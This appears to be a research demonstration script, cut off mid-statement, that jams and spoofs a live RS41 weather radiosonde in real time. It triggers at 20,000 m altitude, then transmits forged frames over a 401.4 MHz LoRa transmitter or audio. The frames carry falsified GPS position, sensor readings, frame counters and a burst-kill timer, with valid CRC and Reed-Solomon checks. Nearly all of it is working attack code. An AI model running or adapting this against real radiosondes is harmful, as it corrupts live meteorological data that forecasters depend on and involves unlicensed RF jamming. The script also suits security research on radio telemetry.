# -*- coding: utf-8 -*-
"""
A real-time spoofing example
"""

#############################################
# The following code demonstrates a real-   #
# time spoofing of an RS41 radiosonde with  #
# an RS41-SG/P radiosonde simulation        #
# framework.                                #
# The code emulates an active airborne      #
# radiosonde, by loading messages from an   #
# RS41 log file and transmitting the        #
# messages as via an audio stream or an RF  #
# transmitter in one-second intervals. The  #
# code assumes that the airborne radiosonde #
# transmissions are received with a         #
# sounding receiver and monitors the        #
# airborne radiosonde data. Upon a          #
# predefined trigger, the code transmits    #
# jamming data via an audio stream or an RF #
# transmitter. After jamming the signal for #
# a certain amount of time, the code        #
# generates spoofed messages, using the     #
# received data and an RS41 log file. The   #
# code transmits the data (via an audio     #
# channel or an RF transmitter) in one-     #
# second intervals. After transmitting a    #
# limited number of frames, the code        #
# returns to transmit jamming data and then #
# stops jamming the airborne radiosonde. A  #
# sounding receiver receiving these         #
# messages will show that airborne          #
# radiosonde signal is lost, then returns   #
# to be active (with spoofed messages),     #
# then lost again and then return to be     #
# active.                                   #
#                                           #
# The code was written by Paz Hameiri in    #
# 2023                                      #
#                                           #
# For more information regarding the RS41'  #
# transmission protocol, see bazjo's work   #
# on RS41 radiosonde at:                    #
# https://github.com/bazjo/RS41_Decoding    #
#                                           #
# If required, install the following:       #
# pip install pyserial                      #
# pip install pyaudio                       #
# pip install skyfield                      #
# pip install keyboard                      #
# pip install pymap3d                       #
# pip install reedsolo                      #
#############################################

from time import sleep
import serial
import pyaudio
from threading import Thread
from skyfield.api import load
import random
import datetime
import keyboard

from RS41Functions import *
from RS41SubframeRW import *
from RS41BlocksRW import *
from RS41SimFunctions import *

# Selects between serial transmission and audio transmission
SerialOrAudio = "Serial"
COMPort1 = "COM5"
COMPort2 = "COM4"

# Define a tranmission function for stream 1
def TxFunction1():
    PrevTriggerTx1 = False
    while RunTxFunction1:
        if (TriggerTx1 and (TriggerTx1 != PrevTriggerTx1)):
            PrevTriggerTx1 = TriggerTx1
            print("                                                                   Tx1: "
                  + datetime.datetime.now(datetime.timezone.utc).strftime("%H:%M:%S.%f")[:-4])
            
            # Check if the output should go to the serial port or to the audio
            if SerialOrAudio == "Serial":
                # Write to serial port 1
                ser1.write(RFMessageByteArray1[0:RFMessageNumOfBytes1])
            else:
                # Write to audio stream 1
                AudioStream1.write((Amplitude1*WaveData1).tobytes())
                
        elif TriggerTx1 != PrevTriggerTx1:
            PrevTriggerTx1 = TriggerTx1
        sleep(0.02)

# Define a tranmission function for stream 2
def TxFunction2():
    PrevTriggerTx2 = False
    while RunTxFunction2:
        if (TriggerTx2 and (TriggerTx2 != PrevTriggerTx2)):
            PrevTriggerTx2 = TriggerTx2
            print("                                                                   Tx2: "
                  + datetime.datetime.now(datetime.timezone.utc).strftime("%H:%M:%S.%f")[:-4])
            
            # Check if the output should go to the serial port or to the audio
            if SerialOrAudio == "Serial":
                # Write to serial port 2
                ser2.write(RFMessageByteArray2[0:RFMessageNumOfBytes2])
            else:
                # Write to audio stream 2
                AudioStream2.write((Amplitude2*WaveData2).tobytes())
                
        elif TriggerTx2 != PrevTriggerTx2:
            PrevTriggerTx2 = TriggerTx2
        sleep(0.02)

# Define subframe array 1
SubFrameArray1 = bytearray(51*16) # 51*16 bytes

# Define subframe array 2
SubFrameArray2 = bytearray(51*16) # 51*16 bytes

# %% RS-41 Model declarations
#############################################
# RS-41 Model declarations #
#############################################

FrameLength = 0x140 # 320 bytes per RS41 regular frame message
LastSubframe = 50 # Last subframe number in each subframe cycle

GPSTimeLeapseconds = 18

# %% Program start
#############################################
# Program start #
#############################################

# Load the satellites file
SkyfieldSatellites = load.tle_file('gps-ops 16-12-2020.txt')

# Get satellites list from SkyfieldSatellites
SkyfieldSatellitesPRN = []
for sv in SkyfieldSatellites:
    # Get the satellite's PRN number
    PRNPlace = sv.name.find("PRN")
    PRNText = sv.name[PRNPlace + 4]
    if sv.name[PRNPlace + 5].isnumeric:
        PRNText = PRNText + sv.name[PRNPlace + 5]
    SkyfieldSatellitesPRN.append(int(PRNText))

# Open a log file and read its contents for stream 1
LogFileName1 = 'RS41-SGP 2021-01-11-S1340533.txt'
LoggedMessagesLength1, LoggedMessages1 = ReadLogFile(LogFileName1)

# Open a log file and read its contents for stream 2
LogFileName2 = 'RS41-SGP 2021-01-09-S1511071.txt'
LoggedMessagesLength2, LoggedMessages2 = ReadLogFile(LogFileName2)

# Find first log record that matches criteria for streams 1 and 2
Criteria = "GPSAltitude>"
CriteriaValue = 20000
CriteriaMet1, CriteriaIndex1 = FindCreteriaInLog(LoggedMessagesLength1, LoggedMessages1, Criteria, CriteriaValue)
CriteriaMet2, CriteriaIndex2 = FindCreteriaInLog(LoggedMessagesLength2, LoggedMessages2, Criteria, CriteriaValue)

# Declare message bytes array 1
MessageBytes1 = bytearray(1024)

# Declare message bytes array 2
MessageBytes2 = bytearray(1024)

# Declare stream 2 message bytes array
Tx2MessageBytes = bytearray(1024)

# Declare jamming message
JammingMessageBytes = bytearray([
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                       0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
JammingMessages = 5
JammingCounter = 0

# Load Subframe 1 data from the text file for stream 1
LoadSuccess1, LoggedMessageIndex1 = LoadSubframeDataFromLog(LastSubframe + 1, LoggedMessagesLength1,
                                                        LoggedMessages1, SubFrameArray1, MessageBytes1)

if not(LoadSuccess1):
    print("Loading the subframes data from the log file 1 failed")

LogRecordToMessageBytes(LoggedMessageIndex1, LoggedMessages1, MessageBytes1)
LastSubframe = GetLastSubframe(MessageBytes1)

# Load Subframe 2 data from the text file for stream 2
LoadSuccess2, LoggedMessageIndex2 = LoadSubframeDataFromLog(LastSubframe + 1, LoggedMessagesLength2,
                                                        LoggedMessages2, SubFrameArray2, MessageBytes2)

if not(LoadSuccess2):
    print("Loading the subframes data from the log file 2 failed")

# RS41 Preamble = 40 bytes of 0x55
PreambleLength = 40
Preamble = bytearray([0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
                      0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
                      0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
                      0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55])

# Prefrom data whitening and reverse bits order MSB->LSB, LSB->MSB on stream 1
ReversedEncryptedMessageBytes1 = DataWhitening(FrameLength, MessageBytes1)

# Gather the complete data bytes that will be transmitted on stream 1
TxDataBytes1 = Preamble + ReversedEncryptedMessageBytes1

# Calculate the number of bytes to be tranmitted in stream 1
TxDataBytesLength1 = 40 + FrameLength # 40 preamble bytes + FrameLength [Bytes]

# Prefrom data whitening and reverse bits order MSB->LSB, LSB->MSB on stream 2
ReversedEncryptedMessageBytes2 = DataWhitening(FrameLength, MessageBytes2)

# Gather the complete data bytes that will be transmitted on stream 1
TxDataBytes2 = Preamble + ReversedEncryptedMessageBytes2

# Calculate the number of bytes to be tranmitted in stream 1
TxDataBytesLength2 = 40 + FrameLength # 40 preamble bytes + FrameLength [Bytes]

# Define RS-41 DataRate
DataRate = 4800 # [BAUD]

# Define RS-41 RF transmission parameters
FrequencyStart1 = 401400000 # [Hz]
FrequencyStart2 = 401400000 # [Hz]
FrequencyDeviation = 2400 # [Hz]

TxFrequency1 = FrequencyStart1/1000000
TxFrequency2 = FrequencyStart2/1000000

# Define RS-41 RF transmission modulation for HELTEC LoRa Node 151 433MHz
Modulation = 2 # 2 = Gaussian filter BT = 0.5

# Define RS-41 RF transmission power for HELTEC LoRa Node 151 433MHz, stream 1
Power1 = 0 # Output power in dBm:  Supports -3dBm to +16dBm, +20dBm

# Define RS-41 RF transmission power for HELTEC LoRa Node 151 433MHz, stream 2
Power2 = 19 # Output power in dBm:  Supports -3dBm to +16dBm, +20dBm

# Calculate the number of bytes in the packet for stream 1
RFMessageHeaderLength = 16
RFMessageNumOfBytes1 = RFMessageHeaderLength + TxDataBytesLength1 # 16 header bytes + TxDataBytes [Bytes]
# Build the RF message byte array for stream 1
RFMessageByteArray1 = SetupRFMessage(RFMessageNumOfBytes1, TxDataBytesLength1, FrequencyStart1, DataRate, FrequencyDeviation, Modulation, Power1)

# Calculate the number of bytes in the packet for stream 2
RFMessageHeaderLength = 16
RFMessageNumOfBytes2 = RFMessageHeaderLength + TxDataBytesLength2 # 16 header bytes + TxDataBytes [Bytes]
# Build the RF message byte array for stream 2
RFMessageByteArray2 = SetupRFMessage(RFMessageNumOfBytes2, TxDataBytesLength2, FrequencyStart2, DataRate, FrequencyDeviation, Modulation, Power2)

# Prepeare the tranmission channel (Serial/Audio)
# Check if the output should go to the serial port or to the audio
if SerialOrAudio == "Serial": 
    # Setup serial port 1
    ser1 = serial.Serial(COMPort1, 57600, timeout=0.7)
    ser2 = serial.Serial(COMPort2, 57600, timeout=0.7) 
else:
    # Define a WAV parameters
    Amplitude1 = 0.08 # In range of [0:1]
    Amplitude2 = 0.8 # In range of [0:1]
    SamplesRate = 44100 # In samples/seconds
    SampleRateMultipliler = SamplesRate / DataRate
    
    # Prepare an audio channel 1
    PAudio1 = pyaudio.PyAudio()
    AudioStream1 = PAudio1.open(format = pyaudio.paFloat32, channels = 1, rate = SamplesRate, output = True)

    # Prepare an audio channel 2
    PAudio2 = pyaudio.PyAudio()
    AudioStream2 = PAudio2.open(format = pyaudio.paFloat32, channels = 1, rate = SamplesRate, output = True)


# Data transmission loop parameters for stream 1
LoggedMessageIndex1 = CriteriaIndex1 - 365
PreviousFrameNumber1 = -1

# Data transmission loop parameters for stream 2
LoggedMessageIndex2 = CriteriaIndex2
PreviousFrameNumber2 = -1
FramesToBeTransmitted = 30

DebugSeconds = 10000000

# Set stream 1 flags
TriggerTx1 = False
RunTxFunction1 = True

# Set stream 2 flags
TriggerTx2 = False
RunTxFunction2 = True
Tx2State = 0 # 0 = No Op., 1 = Jam, 2 = Tx
Tx2FrameNumber = 0

if __name__ == '__main__':
    Thread(target = TxFunction1).start()
    Thread(target = TxFunction2).start()

InitialUTCTime = datetime.datetime.now(datetime.timezone.utc)
TxPreparationUTCTime1 = InitialUTCTime
TxPreparationUTCTime2 = InitialUTCTime
TxUTCTime1 = InitialUTCTime + datetime.timedelta(seconds=10)
TxUTCTime2 = InitialUTCTime + datetime.timedelta(seconds=10)
DatetimeTimeFormat = "%Y-%m-%d %H:%M:%S"

DebugTimeDiff = 0
while (LoggedMessageIndex1 < LoggedMessagesLength1) and (DebugTimeDiff < DebugSeconds):
    UTCTime = datetime.datetime.now(datetime.timezone.utc)
    UTCTimeMicroseconds = UTCTime.microsecond
    
    DebugTimeDiff = int((UTCTime - InitialUTCTime).total_seconds())
    
    # Prepare transmission for stream 1
    if (UTCTimeMicroseconds < 50000) and (UTCTime >= TxPreparationUTCTime1):
        # Prepare the next data to be transmitter
                 
        # Load the logged message for stream 1
        LogRecordToMessageBytes(LoggedMessageIndex1, LoggedMessages1, MessageBytes1)

        # Try and correct the data using the Reed-Solomon ECC fro stream 1
        RSRecovered1 = False
        try:
            RSRecovered1 = DecodeReedSolomon(MessageBytes1)
        except Exception: 
            pass

        # Advance LoggedMessageIndex1
        LoggedMessageIndex1 = LoggedMessageIndex1 + 1
        
        # Zero frame number skipping time for stream 1
        FrameSkippingSleepTime1 = 0
        
        # Check RS41 STATUS block CRC code for stream 1
        if CheckSTATUSblockCRC(MessageBytes1):
            # Get frame number for stream 1
            FrameNumber1 = GetFrameNumber(MessageBytes1)
            
            # Check if there's a previous FrameNumber.
            # If so, calculate sleeping time in case of frame number skipping
            if (PreviousFrameNumber1 > -1):
                FrameSkippingSleepTime1 = FrameNumber1 - PreviousFrameNumber1 - 1
            
            # Update PreviousFrameNumber for stream 1
            PreviousFrameNumber1 = FrameNumber1
            
            # If the Reed-Solomon ECC passed and stream 2 is inactive, get the current subframe
            if RSRecovered1 and (Tx2State == 0):
                SubframeNumber1 = GetSubframe(MessageBytes1)
                LoadSubFrameBytes(SubframeNumber1, SubFrameArray1, MessageBytes1)

        # Check if the message match the triggering criteria
        LocalCriteriaMet = FindCreteriaInMessage(MessageBytes1, Criteria, CriteriaValue)
        if LocalCriteriaMet and (Tx2State == 0) and (Tx2FrameNumber == 0) and RSRecovered1:
            Tx2MessageBytes = MessageBytes1.copy()
            Tx2State = 1 # Set Tx2State: 0 = No Op., 1 = Jam, 2 = Tx

        # Calculate future transmission time for stream 1
        TxUTCTime1 = UTCTime.replace(microsecond=0) + datetime.timedelta(seconds=FrameSkippingSleepTime1)
        TxPreparationUTCTime1 = TxUTCTime1 + datetime.timedelta(seconds=1)
      
        # Prefrom data whitening and reverse bits order MSB->LSB, LSB->MSB for stream 1
        ReversedEncryptedMessageBytes1 = DataWhitening(FrameLength, MessageBytes1)
 
        # Place the data bytes in the outgoing message for stream 1
        TxDataBytes1[PreambleLength:TxDataBytesLength1] = ReversedEncryptedMessageBytes1
        RFMessageByteArray1[16:16+TxDataBytesLength1] = TxDataBytes1
        
        # Check if the output should go to the serial port or to the audio
        if SerialOrAudio == "Audio":
            # Build the wave data from the TxDataBytes and wave paramters for stream 1
            WaveData1 = BuildAudioStream(TxDataBytes1, TxDataBytesLength1, SampleRateMultipliler, DataRate, SamplesRate)
             
        # Print preparation details for stream 1
        print('Prep end: ' + datetime.datetime.now(datetime.timezone.utc).strftime("%H:%M:%S.%f")[:-4] +
              ', Skip time: ' + str(FrameSkippingSleepTime1) +
              ', Next prep: ' + TxPreparationUTCTime1.strftime("%H:%M:%S") +
              ', Expected Tx1: ' + TxUTCTime1.strftime("%H:%M:%S"))

    # Prepare transmission for stream 2
    if (UTCTimeMicroseconds < 50000) and (UTCTime >= TxPreparationUTCTime2) and (Tx2State > 0):
        # Prepare the next data to be transmitter
                 
        # Load the logged message for stream 2
        LogRecordToMessageBytes(LoggedMessageIndex2, LoggedMessages2, MessageBytes2)

        # Zero frame number skipping time for stream 2
        FrameSkippingSleepTime2 = 0

        # Try and correct the data using the Reed-Solomon ECC for stream 2
        RSRecovered2 = False
        try:
            RSRecovered2 = DecodeReedSolomon(MessageBytes2)
        except Exception: 
            pass

        # Advance LoggedMessageIndex2
        LoggedMessageIndex2 = LoggedMessageIndex2 + 1
      
        # Check if this is the first time that the frame is processed.
        # If so - read parameters
        # If not - process the data
        if Tx2FrameNumber == 0:
            # Get frame number
            Tx2FrameNumber = GetFrameNumber(Tx2MessageBytes)
            RefFrameNumber1 = GetFrameNumber(Tx2MessageBytes)
            # Get subframe number
            Tx2SubframeNumber = GetSubframe(Tx2MessageBytes)
            # Check if an offset to the burstkill counter is required
            BurstKillTimeUntilKill = GetBurstKillTimeUntilKill(SubFrameArray1)
            if (Tx2SubframeNumber < 0x32) and (BurstKillTimeUntilKill > -1):
                SetBurstKillTimeUntilKill(BurstKillTimeUntilKill - Tx2SubframeNumber - 1, SubFrameArray1)
            # Get GPSINFO block data
            (Tx2GPSWeek, Tx2GPSMilliseconds, _,
                 Tx2SVsReceptionQualityTable, _) = ReadGPSINFOblock(Tx2MessageBytes)
            # Get GPSINFO block data
            (Tx2GPSWeek, Tx2GPSMilliseconds, _,
                 Tx2SVsReceptionQualityTable, _) = ReadGPSINFOblock(Tx2MessageBytes)
            # Get GPSPOS block data starting values
            # Get ECEF Position X in [m]
            Tx2RefECEFPositionX = GetECEFPositionX(Tx2MessageBytes)
            # Get ECEF Position Y in [m]
            Tx2RefECEFPositionY = GetECEFPositionY(Tx2MessageBytes)
            # Get ECEF Position Z in [m]
            Tx2RefECEFPositionZ = GetECEFPositionZ(Tx2MessageBytes)
            # Get sAcc
            Tx2GPSsAcc = GetGPSsAcc(Tx2MessageBytes)
            # Get model number
            RS41Model = GetRS41Model(SubFrameArray1).rstrip('\x00')
            # Get MEAS block reference data from stream 1
            RefTx2AmbTemp = GetAmbientTemperature(SubFrameArray1, Tx2MessageBytes)
            RefTx2HeaterTemp = GetHeaterTemperature(SubFrameArray1, Tx2MessageBytes)
            # Convert ECEF coordinates to GPS geodetic
            Tx2GPSLatitudeN, Tx2GPSLongitudeE, Tx2GPSAltitude = pymap3d.ecef2geodetic(Tx2RefECEFPositionX, Tx2RefECEFPositionY, Tx2RefECEFPositionZ)
            if (RS41Model == "RS41-SGP"):
                RefTx2AmbPress = GetPressure(SubFrameArray1, Tx2MessageBytes)
            else:
                RefTx2AmbPress = 0
            RefTx2RelHumid = GetRelativeHumidity(RS41Model, RefTx2AmbPress, Tx2GPSAltitude, 
                                    RefTx2AmbTemp, RefTx2HeaterTemp, SubFrameArray1, Tx2MessageBytes)
            # Get GPSPOS block reference data from stream 2
            # Get ECEF Position X in [m]
            RefECEFPositionX2 = GetECEFPositionX(MessageBytes2)
            # Get ECEF Position Y in [m]
            RefECEFPositionY2 = GetECEFPositionY(MessageBytes2)
            # Get ECEF Position Z in [m]
            RefECEFPositionZ2 = GetECEFPositionZ(MessageBytes2)
            # Get the sattelites order and rearrange the SkyfieldSatellites accordingly
            PRNandReceptionQualityIndicatorArray1, _ = GetSVsReceptionQualityData(Tx2MessageBytes)
            MessagePRNlist = PRNandReceptionQualityIndicatorArray1[::2]
            SkyfieldSatellites2 = []
            for PRN in MessagePRNlist:
                if PRN in SkyfieldSatellitesPRN:
                    SkyfieldSatellites2.append(SkyfieldSatellites[SkyfieldSatellitesPRN.index(PRN)])
            for PRN in SkyfieldSatellitesPRN:
                if PRN not in MessagePRNlist:
                    SkyfieldSatellites2.append(SkyfieldSatellites[SkyfieldSatellitesPRN.index(PRN)])
            svIndex = 0
            # Get MEAS block reference data from stream 2
            RefAmbTemp2 = GetAmbientTemperature(SubFrameArray2, MessageBytes2)
            RefHeaterTemp2 = GetHeaterTemperature(SubFrameArray2, MessageBytes2)
            # Convert ECEF coordinates to GPS geodetic
            GPSLatitudeN2, GPSLongitudeE2, GPSAltitude2 = pymap3d.ecef2geodetic(RefECEFPositionX2, RefECEFPositionY2, RefECEFPositionZ2)
            if (RS41Model == "RS41-SGP"):
                RefAmbPress2 = GetPressure(SubFrameArray2, MessageBytes2)
            else:
                RefAmbPress2 = 0
            RefRelHumid2 = GetRelativeHumidity(RS41Model, RefAmbPress2, GPSAltitude2, 
                                    RefAmbTemp2, RefHeaterTemp2, SubFrameArray2, MessageBytes2)
        else:
            if RSRecovered2:
                # Advance the Frame Number in Tx2 frame
                Tx2FrameNumber = Tx2FrameNumber + 1
                SetFrameNumber(Tx2FrameNumber, Tx2MessageBytes)
                
                # Advance the SubFrame Number in Tx2 frame
                if Tx2SubframeNumber == LastSubframe:
                    Tx2SubframeNumber = 0
                else:
                    Tx2SubframeNumber = Tx2SubframeNumber + 1
                SetSubframe(Tx2SubframeNumber, Tx2MessageBytes)
                              
                # Load the relevant subframe to the frame that is about to be transmitted
                SetSubFrameBytes(Tx2SubframeNumber, SubFrameArray1, Tx2MessageBytes)
                
                # Advacne GPS time
                if Tx2GPSMilliseconds >= 604799000:
                    Tx2GPSMilliseconds = 0
                    Tx2GPSWeek = Tx2GPSWeek + 1
                    SetGPSWeek(Tx2GPSWeek, Tx2MessageBytes)
                else:
                    Tx2GPSMilliseconds = Tx2GPSMilliseconds + 1000
                SetGPSMilliseconds(Tx2GPSMilliseconds, Tx2MessageBytes)
                
                # Convert GPS time to python datetime
                GPSEpoch = datetime.datetime(1980, 1, 6, 0, 0, 0, tzinfo=datetime.timezone.utc)
                Time1Delta = datetime.timedelta(days=(7 * Tx2GPSWeek), seconds=(Tx2GPSMilliseconds / 1000 - GPSTimeLeapseconds))
                Tx2UTCTime = GPSEpoch + Time1Delta
    
                # Read GPSPOS block parameters for stream 2
                (ECEFPositionX2, ECEFPositionY2, ECEFPositionZ2,
                 ECEFVelocityX2, ECEFVelocityY2, ECEFVelocityZ2,
                 _, _, _, _) = ReadGPSPOSblock(MessageBytes2)
                
                # Convert ECEF coordinates to GPS geodetic
                GPSLatitudeN2, GPSLongitudeE2, GPSAltitude2 = pymap3d.ecef2geodetic(ECEFPositionX2, ECEFPositionY2, ECEFPositionZ2)
                                
                # Convert ECEF velocity to GPS geodetic velocity
                GPSVelEast2, GPSVelNorth2, GPSVelUp2 = pymap3d.ecef2enuv(ECEFVelocityX2, ECEFVelocityY2, ECEFVelocityZ2, GPSLatitudeN2, GPSLongitudeE2)               

                # Offset the position data
                ECEFPositionX2 = ECEFPositionX2 - RefECEFPositionX2 + Tx2RefECEFPositionX
                ECEFPositionY2 = ECEFPositionY2 - RefECEFPositionY2 + Tx2RefECEFPositionY
                ECEFPositionZ2 = ECEFPositionZ2 - RefECEFPositionZ2 + Tx2RefECEFPositionZ

                # Convert ECEF coordinates to GPS geodetic
                Tx2GPSLatitudeN, Tx2GPSLongitudeE, Tx2GPSAltitude = pymap3d.ecef2geodetic(ECEFPositionX2, ECEFPositionY2, ECEFPositionZ2)
                                
                # Calculate the new GPS data
                (_, Tx2NumberOfSVs,
                 Tx2PRNandReceptionQualityIndicatorArray,
                 Tx2PsaudorangeandVelocityArray,
                 Tx2GPSPDOP, Tx2MinPR,
                 Tx2ECEFPositionX, Tx2ECEFPositionY, Tx2ECEFPositionZ, 
                 Tx2ECEFVelocityX, Tx2ECEFVelocityY, Tx2ECEFVelocityZ) = CalculateGPSData(SkyfieldSatellites2, Tx2UTCTime,
                                                                                 Tx2GPSLatitudeN, Tx2GPSLongitudeE, Tx2GPSAltitude,
                                                                                 GPSVelEast2, GPSVelNorth2, GPSVelUp2)
                                                              
                # Get MEAS block data from stream 2
                AmbTemp2 = GetAmbientTemperature(SubFrameArray2, MessageBytes2)
                HeaterTemp2 = GetHeaterTemperature(SubFrameArray2, MessageBytes2)
                if (RS41Model == "RS41-SGP"):
                    AmbPress2 = GetPressure(SubFrameArray2, MessageBytes2)
                else:
                    AmbPress2 = 0
                RelHumid2 = GetRelativeHumidity(RS41Model, AmbPress2, GPSAltitude2, 
                                    AmbTemp2, HeaterTemp2, SubFrameArray2, MessageBytes2)

                # Offset MEAS block data
                Tx2AmbTemp = RefTx2AmbTemp - RefAmbTemp2 + AmbTemp2
                Tx2HeaterTemp = RefTx2HeaterTemp - RefHeaterTemp2 + HeaterTemp2
                if (RS41Model == "RS41-SGP"):
                    Tx2AmbPress = RefTx2AmbPress - RefAmbPress2 + AmbPress2
                else:
                    Tx2AmbPress = 0
                Tx2RefRelHumid = RefTx2RelHumid - RefRelHumid2 + RelHumid2
                 
                # Set MEAS block data                
                SetMainAmbientTemperature(Tx2AmbTemp, SubFrameArray1, Tx2MessageBytes)
                SetMainHeaterTemperature(Tx2HeaterTemp, SubFrameArray1, Tx2MessageBytes)
                if (RS41Model == "RS41-SGP"):
                    SetMainPressure(Tx2AmbPress, SubFrameArray1, Tx2MessageBytes)
                SetMainRelativeHumidity(Tx2RefRelHumid, RS41Model, Tx2AmbPress, Tx2GPSAltitude, 
                                        Tx2AmbTemp, Tx2HeaterTemp, SubFrameArray1, Tx2MessageBytes)

                # Set the STATUS block CRC code
                SetSTATUSblockCRC(Tx2MessageBytes)
                                                          
                # Build a new GPSINFO block
                BuildGPSINFOblock(Tx2GPSWeek, Tx2GPSMilliseconds, Tx2PRNandReceptionQualityIndicatorArray, Tx2MessageBytes)                                                                 
    
                # Build a new GPSRAW block
                BuildGPSRAWblock(Tx2MinPR, Tx2PsaudorangeandVelocityArray, Tx2MessageBytes)
    
                # Build a new GPSPOS block
                BuildGPSPOSblock(Tx2ECEFPositionX, Tx2ECEFPositionY, Tx2ECEFPositionZ,
                                     Tx2ECEFVelocityX, Tx2ECEFVelocityY, Tx2ECEFVelocityZ,
                                     Tx2NumberOfSVs, Tx2GPSsAcc, Tx2GPSPDOP, Tx2MessageBytes)

                # Set the MEAS block CRC code
                SetMEASblockCRC(Tx2MessageBytes)    
     
                # Set the Reed-Solomon ECC bytes
                SetReedSolomon(Tx2MessageBytes)

        # Calculate future transmission time for stream 2
        TxUTCTime2 = UTCTime.replace(microsecond=0)
        TxPreparationUTCTime2 = TxUTCTime2 + datetime.timedelta(seconds=1)

        # Advance the burst kill timer
        BurstKillTimeUntilKill = GetBurstKillTimeUntilKill(SubFrameArray1)
        if BurstKillTimeUntilKill > -1:
            SetBurstKillTimeUntilKill(BurstKillTimeUntilKill - 1, SubFrameArray1)

        # Check what data is to be transmitted
        if (Tx2State == 2):
            # Check if it's time to finish the transmission on stream 2
            # If so - start the second jamming phase
            if (Tx2FrameNumber > RefFrameNumber1 + FramesToBeTransmitted):
                # Set jamming state
                Tx2State = 1
                # Set jamming data in the buffer
                ReversedEncryptedMessageBytes2 = JammingMessageBytes
                # Advance hamming counter
                JammingCounter = JammingCounter + 1
            # if an updated frame was recovered from the log, then transmit a new synthetic frame in stream 2
            # otherwise, transmit noise to prevent the receiver from getting the real frame from stream 1
            elif RSRecovered2:
                # Check if a messgae has been lost in the middle.
                # If so, transmit a jamming message.
                # If not, tranmsit the data
                FrameNumber2 = GetFrameNumber(MessageBytes2)
                if (PreviousFrameNumber2 > -1) and (FrameNumber2 - PreviousFrameNumber2 > 1):
                    # Set the value of FrameSkippingSleepTime1
                    FrameSkippingSleepTime2 = FrameNumber2 - PreviousFrameNumber2 - 1
                    # Set jamming data in the buffer
                    ReversedEncryptedMessageBytes2 = JammingMessageBytes
                    # Advance the PreviousFrameNumber1
                    PreviousFrameNumber2 = PreviousFrameNumber2 + 1
                    # Decrement LoggedMessageIndex2 by 1
                    LoggedMessageIndex2 = LoggedMessageIndex2 - 1
                else:
                    # Prefrom data whitening and reverse bits order MSB->LSB, LSB->MSB for stream 2
                    ReversedEncryptedMessageBytes2 = DataWhitening(FrameLength, Tx2MessageBytes)
                    # Update PreviousFrameNumber for stream 2
                    PreviousFrameNumber2 = FrameNumber2
            else:
                # Set jamming data in the buffer
                ReversedEncryptedMessageBytes2 = JammingMessageBytes
        elif (Tx2State == 1):
            if (JammingCounter < JammingMessages):
                # Set jamming data in the buffer
                ReversedEncryptedMessageBytes2 = JammingMessageBytes
                # Advance hamming counter
                JammingCounter = JammingCounter + 1
            elif (JammingCounter == JammingMessages):
                Tx2State = 2 # Set Tx2State: 0 = No Op., 1 = Jam, 2 = Tx
            elif (JammingCounter < 2*JammingMessages):
                    # Set jamming data in the buffer
                    ReversedEncryptedMessageBytes2 = JammingMessageBytes
                    # Advance hamming counter
                    JammingCounter = JammingCounter + 1
            elif (JammingCounter == 2*JammingMessages):
                    Tx2State = 0 # Set Tx2State: 0 = No Op., 1 = Jam, 2 = Tx

        # Place the data bytes in the outgoing message for stream 2
        TxDataBytes2[PreambleLength:TxDataBytesLength2] = ReversedEncryptedMessageBytes2
        RFMessageByteArray2[16:16+TxDataBytesLength2] = TxDataBytes2
        
        # Check if the output should go to the serial port or to the audio
        if SerialOrAudio == "Audio":
            # Build the wave data from the TxDataBytes and wave paramters for stream 2
            WaveData2 = BuildAudioStream(TxDataBytes2, TxDataBytesLength2, SampleRateMultipliler, DataRate, SamplesRate)
             
        # Print preparation details for stream 2
        print('Prep end: ' + datetime.datetime.now(datetime.timezone.utc).strftime("%H:%M:%S.%f")[:-4] +
              ', Skip time: ' + str(FrameSkippingSleepTime2) +
